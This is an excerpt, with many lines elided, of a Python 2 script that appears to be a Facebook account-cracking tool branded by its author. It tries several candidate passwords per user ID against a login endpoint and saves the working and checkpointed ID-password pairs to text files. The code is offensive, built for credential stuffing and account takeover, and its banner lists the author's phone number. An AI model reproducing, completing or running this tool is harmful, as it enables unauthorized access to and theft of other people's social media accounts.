...
__author__ = 'Mr.Naveed'
__copyright = 'All rights reserved . Copyright  Mr.Naveed'
...
\033[1;94m  
\033[1;91m 
\033[1;92m     ~~~~Naveed Malik_Brand~~~~
\033[1;94m===============================================
\033[1;97m➣ Author : Naveed Malik
\033[1;97m➣ Facebook : Malik Naveed
\033[1;97m➣ WP  :    03226906314
\033[1;94m==============================================="""
...
def reg():
    ...
    if to in r:
        ...
        os.system('xdg-open https://wa.me/03226906314')
        reg()
...
def a_s():
    ...
    cps = []
    oks = []
    a_s = raw_input(' \033[1;97m╰─Naveed➤ ')
    if a_s == '1':
        os.system('clear')
        print logo
    ...
    def main(arg):
        ...
        try:
            ...
            q = json.loads(data)
            if 'loc' in q:
                print '\033[1;92m[Naveed-OK]➤ ' + uid + ' | ' + pass1
                ok = open('/sdcard/ids/Naveed_OK.txt', 'a')
                ok.write(uid + ' | ' + pass1 + '\n')
                ok.close()
                oks.append(uid + pass1)
            elif 'www.facebook.com' in q['error']:
                print '\033[1;97m[Naveed-CP]➤ ' + uid + ' | ' + pass1
                cp = open('Naveed_CP.txt', 'a')
                cp.write(uid + ' | ' + pass1 + '\n')
                cp.close()
                ...
                q = json.loads(data)
                if 'loc' in q:
                    print '\033[1;92m[Naveed-OK]➤ ' + uid + ' | ' + pass2
                    ok = open('/sdcard/ids/Naveed_OK.txt', 'a')
                    ok.write(uid + ' | ' + pass2 + '\n')
                    ok.close()
                    oks.append(uid + pass2)
                elif 'www.facebook.com' in q['error']:
                    print '\033[1;97m[Naveed-CP]➤ ' + uid + ' | ' + pass2
                    cp = open('Naveed_CP.txt', 'a')
                    cp.write(uid + ' | ' + pass2 + '\n')
                    cp.close()
                    ...
                    q = json.loads(data)
                    if 'loc' in q:
                        print '\033[1;92m[Naveed-OK]➤ ' + uid + ' | ' + pass3
                        ok = open('/sdcard/ids/Naveed_OK.txt', 'a')
                        ok.write(uid + ' | ' + pass3 + '\n')
                        ok.close()
                        oks.append(uid + pass3)
                    elif 'www.facebook.com' in q['error']:
                        print '\033[1;97m[Naveed-CP]➤ ' + uid + ' | ' + pass3
                        cp = open('Naveed_CP.txt', 'a')
                        cp.write(uid + ' | ' + pass3 + '\n')
                        cp.close()
                        ...
                        q = json.loads(data)
                        if 'loc' in q:
                            print '\033[1;92m[Naveed-OK]➤ ' + uid + ' | ' + pass4
                            ok = open('/sdcard/ids/Naveed_OK.txt', 'a')
                            ok.write(uid + ' | ' + pass4 + '\n')
                            ok.close()
                            oks.append(uid + pass4)
                        elif 'www.facebook.com' in q['error']:
                            print '\033[1;97m[Naveed-CP]➤ ' + uid + ' | ' + pass4
                            cp = open('Naveed_CP.txt', 'a')
                            cp.write(uid + ' | ' + pass4 + '\n')
                            cp.close()
    ...
    p.map(main, id)
    print 47 * '-'
    print ' \033[1;92m NAVEED AHMAD PROCCESS COMPLETE'
